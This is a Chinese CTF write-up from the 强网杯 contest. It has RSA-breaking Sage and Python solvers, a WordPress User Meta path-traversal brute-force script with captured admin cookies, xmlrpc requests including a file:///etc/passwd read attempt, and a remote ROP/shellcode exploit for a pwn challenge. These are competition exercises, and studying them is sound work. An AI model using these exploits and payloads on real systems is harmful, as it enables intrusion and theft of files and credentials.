n3=539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821




p=(iroot(r,6))[0]






q=n3//(p**7)


assert n3==p**7*q




d=invert(e3,p**6*(p-1)*(q-1))


print(long_to_bytes(pow(c3,d,n3)))


#sage部分
n1=801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637
n2=635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371




# for xy in continued_fraction(n2/n1).convergents():
#     y=xy.numerator()
#     x=xy.denominator()
#     if(x*y==0):
#         continue
#     if(n2%y==0):
#         print(y,1)
    
q2=9812307529878534533661886151798479597308643205831633694536059253544567512641416154404619650558662569143606800292316828847011290671363968521713496965528179
q1=12370355547674749572455673590243846686064589395972173910159503331075522229248564072110567010323038590199605349860669572361407072636726496740593208338661853


e1=1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865
e2=1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881


c1=18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579
c2=336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665




n2=209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209
m1=167033559384298522723574512241709447697750495062051373339874928117760768631565225663704494711294488556402223152830158600944819657473430506318731286655519728589208977191031849602792050411662024383502548579402516538753112670329781366297260905517214408459895097308286783418547254449419676568096534767340832822470233461516097690657337287889405321592527860524201824371955082411119548743528220794151774190322092515459637969925138496615421690273925560390321721643556915400569894100488394008220811596560968566833296068500476868375996187754631888256419438775013308064639754700359028260289266420692324376220460340153811660590804281527733243177527178698523018103373311259548716062006020121615186595491453534952848570829485638553678760994354019044715078062414748269425818079274218450448217803229617020494546843594180682307375768323235309661628678546003718924902228908888185484412626429441196588985691713767554591991735686919964937441820738008046218954331990752603146125777571183543616375946363623251491371247594696767767918341279655251868517380267258878990871525012299220182939441091806206624720194246691865367941280852353547267930167542329486261552854451001546455904682702366584763940463481732752992487773878685793275652314513014646439770319249
m2=69076592619651589706691933313826601279528159013379300261609967352748175972662567592943146333144902972780621576811778115958019397062270814057821407036352529372113467206560849267275602453288227390740346959857322649956992529510338912182696854496200041245775322561359546062736323363354733510660780489558215103581313753430117471361013972291126160134685745917715386613876414886325025010348396410346222272648657374977901786530969589123771261040601627906959627351426881111464943086191212001374558078570830214670111422731410682212770683631011038163623234630601007231955235905528750031898751733232446644402069580930596404887288935724879795199659228145390574503341087565153744389617539607111733080406125228559950446336384154674927952991964565965760896308198785777527690939982523416579778957846249005801121682470447753074839399698315364445972142571727376297422736232659133510385808957304351692629177239808890209690661982628408419571131470406142532800330250274534615063537773403062635865734585850821677880659194795963303700015814615804751909674946908768425855361277478190640780518117596780808975720826484146074528564147729911624750510271539697935538038871993380673492022099183863825435237650082706168588306816635866830411481021066926833372846305


PR.<x>=PolynomialRing(Zmod(n2))


f=(m1*m2)*x+(m1-m2)
f=f.monic()




x0=f.small_roots(X=2**673,beta=1/7)[0]






N=539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821
b=17623328397444755087284107444487160871617682792372566887446834913712379373851213638071138745775127796589871734472781755930251379295485892067473329763997583502625804363418069062645997342172778252731889437
e=8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145
PR.<x>=PolynomialRing(Zmod(N))


f=e*x-b
f=f.monic()


x0=f.small_roots(X=2**673,beta=1/7)[0]
print(gcd(int(f(x0)),N))
```



## **ASR **

​                 ![img](https://docimg10.docs.qq.com/image/RC1v3_U5rIiGchqncAl_SQ.png?w=1280&h=128.93042575285565)        



```python
from Crypto.Util.number import *
from gmpy2 import *
import random
    
def Legendre(a,p):      
    return (pow((a%p+p)%p,(p-1)//2,p))%p


def ex_Legendre(a,p,r):     
    return (pow(a,(p-1)//r,p)==1)


def get_nonre(p):
    a=random.randint(1,p)
    while Legendre(a,p)==1:
        a=random.randint(1,p)
    return a


def get_ex_nonre(p,r):
    a=random.randint(1,p)
    while ex_Legendre(a,p,r)==1:
        a=random.randint(1,p)
    return a


def get_ts(p):
    p=p-1
    count=0
    while p%2==0:
        count+=1
        p=p//2
    return count,p


def get_ex_ts(p,r):
    P=p-1
    count=0
    while P%r==0:
        count+=1
        P=P//r
    return count,P


def get_alpha(r,s):
    try:
        k=-1*invert(s,r)%r
        alpha=(s*k+1)//r
    except:
        k=1
        while (s*k+1)%r!=0:
            k+=1
        alpha=(s*k+1)//r
    return alpha


def amm2(a,p):
    t,s=get_ts(p)
    ta=pow(get_nonre(p),s,p)
    tb=pow(a,s,p)
    h=1
    for i in range(1,t):
        d=pow(tb,2**t-1-i,p)
        if d==1:
            k=0
        else:
            k=1
        tb=(tb*pow(ta,2*k,p))%p
        h=(h*pow(ta,k,p))%p
        ta=pow(ta,2,p)
    return h*pow(a,(s+1)//2,p)%p


def ammr(a,p,r):        
    t,s=get_ex_ts(p,r)
    assert gcd(r,s)==1
    print("t:",t)
    alpha=get_alpha(r,s)
    rho=get_ex_nonre(p,r)
    ta=pow(rho,(s*r**(t-1))%(p-1),p)
    tb=pow(a,r*alpha-1,p)
    tc=pow(rho,s,p)
    h=1
    if t==0:
        return pow(a,alpha,p)*h%p,ta,p
    for i in range(1,t-1):
        d=pow(tb,r**(t-1-i),p)
        if d==1:
            j=0
        else:
            print("dddd")
            j=-sympy.discrete_log(p,d,ta)
            #j=-math.log(d,a)
            print(j)
        tb=tb*pow(pow(tc,r,p),j)%p      
        h=h*pow(tc,j,p)%p
        tc=pow(tc,r,p)
    return pow(a,alpha,p)*h%p,ta,p


def extend(root,ta,p,r):
    res=set()
    for i in range(r):
        tmp=root*pow(ta,i,p)%p
        res.add(tmp)
    return list(res)




def CRT(a,b):
    pro=1
    res=0
    for i in b:
        pro*=i
    for i in range(len(b)):
        R=pro//b[i]
        res+=a[i]*R*invert(R,b[i])
    return res%pro


def check(root,ee,cc,p):         
    judge=ee*pow(root,ee-1,p)%p 
    if judge==0:
        return 0
    return 1


def lifting(root,p,ee,cc):
    if not check(root,ee,cc,p):
        print("check failed")
        return
    res=(root-(root**ee-cc)*invert(ee*root**(e-1),p**2))%p**2
    return res


def rsa(c,e,p):
    d=invert(e,p-1)
    return pow(c,d,p)


def solve_prime(a,p,r):      #解当指数r为素数的情形
    RES=ammr(a,p,r)
    L=extend(RES[0],RES[1],RES[2],r)
    return L




c=945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149
n=8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001
e=3


p1=218566259296037866647273372633238739089
p2=223213222467584072959434495118689164399
p3=225933944608558304529179430753170813347
p4=260594583349478633632570848336184053653




L1=solve_prime(c%p1,p1,e)
L2=rsa(c%p2,e,p2)
L3=solve_prime(c%p3,p3,e)
L4=rsa(c%p4,e,p4)


for i in L1:
    for j in L3:
        '''
        m1=lifting(i,p1,e,c%p1)
        m2=lifting(L2,p2,e,c%p2)
        m3=lifting(j,p3,e,c%p3)
        m4=lifting(L4,p4,e,c%p4)
        '''
        
        #print(pow(m1,e,p1**2)==c%p1**2)
        m=CRT([i,L2,j,L4],[p1,p2,p3,p4])
        #print(pow(m,e,n)==c)
        m=long_to_bytes(m)
        if b'flag' in m:
            print(m)
#b'flag{Fear_can_hold_you_prisoner_Hope_can_set_you_free}\x06\x06\x06\x06\x06\x06'      
```





# **强网先锋**



## RCEFILE 

原题：https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html



## WP-UM 

​                 ![img](https://docimg1.docs.qq.com/image/hYRa0QDzx7DiQBfx1rZmzg.png?w=1244&h=292)        

猫哥的私密信息的格式是flag{}



```
//setup-config.php
$dbname = trim( wp_unslash( 'wordpress' ) );
$uname  = trim( wp_unslash( 'root' ) );
$pwd    = trim( wp_unslash( '123456' ) );
$dbhost = trim( wp_unslash( 'localhost' ) );
$prefix = trim( wp_unslash( 'wp_' ) );
```

```
wpscan --url http://eci-2zefnon2z47h80q04124.cloudeci1.ichunqiu.com/ -e p --enumerate u


username(10): maogepamao
password(15): 
```

利用xmlrpc.php，列举可用方法

```
POST /xmlrpc.php HTTP/1.1
Host: eci-2ze1o95qor1o5kx7lyde.cloudeci1.ichunqiu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1651650739
Upgrade-Insecure-Requests: 1
Content-Length: 91


<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>




HTTP/1.1 200 OK
Date: Sat, 30 Jul 2022 14:28:58 GMT
Content-Type: text/xml; charset=UTF-8
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.3.22
Content-Length: 4319


<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>ump.validate</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

读文件(失败)

```
POST /xmlrpc.php HTTP/1.1
Host: eci-2ze1o95qor1o5kx7lyde.cloudeci1.ichunqiu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1651650739
Upgrade-Insecure-Requests: 1
Content-Length: 211


<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>pingback.ping
</methodNmae>
<params>
<param>
<value>
<string>
file:///etc/passwd
</string>
</value>
</param>
</params>
</methodCall>
```

https://skynettools.com/wordpress-user-meta-lite-and-pro-2-4-3-vulnerable-to-path-traversal-exploit/

phpinfo

```
http://eci-2ze1o95qor1o5kx7lyde.cloudeci1.ichunqiu.com/wp-content/plugins/user-meta/views/debug.php?phpinfo=1
```

```
MaoGePaMao
MaoGeYaoQiFeiLa
```

```python
import requests


session = requests.Session()
a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
paramsPost = {"field_id":"um_field_2","is_ajax":"true","form_key":"upload","filepath":"/../../../../../password/1M","action":"um_show_uploaded_file","pf_nonce":"0296b70753","field_name":"upload"}
headers = {"Origin":"http://eci-2ze4dm8xhkfttv7n5leh.cloudeci1.ichunqiu.com","Accept":"*/*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36","Referer":"http://eci-2ze4dm8xhkfttv7n5leh.cloudeci1.ichunqiu.com/index.php/upload/","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9","Content-Type":"application/x-www-form-urlencoded"}
cookies = {"wordpress_0494c5c8dfe24eaa9fac863bece1c2e1":"admin%7C1660410192%7Cb8a1gd4uRfLmA0m5X8Ckgf3EpWbMhCuC8EOmord71Xk%7C1c929f7d11f67bfe0a1c00a9791156e7bcec1bb1f47b1ea4499a4192498941be","wordpress_logged_in_0494c5c8dfe24eaa9fac863bece1c2e1":"admin%7C1660410192%7Cb8a1gd4uRfLmA0m5X8Ckgf3EpWbMhCuC8EOmord71Xk%7C554c711e186c04b417fd1e6769a1fae29140b7d1c1479895e7a6c72471cbbf8f","chkphone":"acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O","Hm_lvt_2d0601bd28de7d49818249cf35d95943":"1658664731,1658900148"}
password=""
for x in range(1,16):
    for y in a:
        tmp = "/../../../../../password/" + str(x)+y
        print(tmp)
        paramsPost['filepath']= tmp
        response = session.post("http://eci-2ze4dm8xhkfttv7n5leh.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php", data=paramsPost, headers=headers, cookies=cookies).text
        print(response)
        if "umRemoveFile" in response:
            password += y
            print(password)
            break


print(password)
```



## polydiv 

​                 ![img](https://docimg6.docs.qq.com/image/RZg_4XyecDRqueba9z044w.png?w=1280&h=108.13093980992608)        

```python
from pwn import *
import hashlib


context.log_level = 'debug'
s=remote("123.56.45.155",40221)
import hashlib
L=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']       


def proof_of_work():
    res=''
    s.recvuntil(b"sha256(XXXX+")
    proof=s.recvuntil(b") == ")
    proof=proof.decode()
    proof=proof[:-5]
    Sha=s.recvuntil(b'\n')
    Sha=Sha.decode()
    Sha.replace('\n','')
    Sha=Sha[:-1]
    for i in range(len(L)):
        for j in range(len(L)):
            for k in range(len(L)):
                for t in range(len(L)):
                    data=L[i]+L[j]+L[k]+L[t]+proof
                    sha=hashlib.sha256()
                    sha.update(data.encode())
                    res=sha.hexdigest()
                    if str(res) == Sha:
                        break
                if str(res) == Sha:
                    break
            if str(res) == Sha:
                break
        if str(res) == Sha:
            break
    return data[:4]


data=proof_of_work()
P.<x>=PolynomialRing(Zmod(2))
s.sendafter(b'Give me XXXX: ',data.encode())




for i in range(40):
    s.recvuntil(b'r(x) = ')
    rx=P(s.recvline().decode().replace("\n",''))


    s.recvuntil(b'a(x) = ')
    ax=P(s.recvline().decode().replace("\n",''))


    s.recvuntil(b'c(x) = ')
    cx=P(s.recvline().decode().replace("\n",''))
    bx=P((rx-cx)*ax^-1)
    s.sendafter(b'> b(x) = ',str(bx).encode())
    s.recvline()
    print(ax*bx+cx==rx)
s.recvline()
'''
[DEBUG] Received 0x50 bytes:
    b'Congratulations, this is you reward.\n'
    b'flag{24ee2853-89a8-4912-aee4-8235c050c94f}\n'
[*] Closed connection to 123.56.45.155 port 40221
'''
```



## devnull 

fgets结束附加\0，将fd覆盖为0；第一个read变为了从标准输入读取，栈溢出覆盖buf，第二个read任意写0x60字节。栈迁移，rop调用mprotect改内存，由于关闭了标准输出，最后执行shellcode orw，输出到标准错误输出。

​	

```python
from pwn import *


context.log_level = 'debug'
context.arch = 'amd64'
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s)
ti = lambda : sh.interactive()


shellcode = shellcraft.open('./flag',0)
shellcode += shellcraft.read('rax', 'rsp', 0x40)
shellcode += shellcraft.write(2, 'rsp', 0x40)




def dbg(addr):
    gdb.attach(sh, 'b *$rebase({addr})\nc\n')
    pause()
#sh = process('./devnull')
sh = remote('182.92.222.142',  30408)
pop_rbp_ret = 0x000000000040129d
mov_rax = 0x0000000000401350
mprotect = 0x0000000004012D0
sa(' your filename','a'*0x20)
sc  = asm(shellcode)


print 'aaaaaaa'+ hex(len(sc))
sa('discard','a'*0x14+p64(0x400000-0x60*5)+p64(0x400000-0x60*5) + p64(0x0000000000401354))
sa('data\n', p64((0x400000-0x60*5 )& 0xfff000) + p64(pop_rbp_ret)+p64(0x400000-0x60*5 +0x18) + p64(mov_rax) + p64(mprotect) + p64(0x400000-0x60*5+0x30) + p64(0x000000000401486))
sd(p64(0x400000-0x60*5+0x30+8) + sc)
ti()
```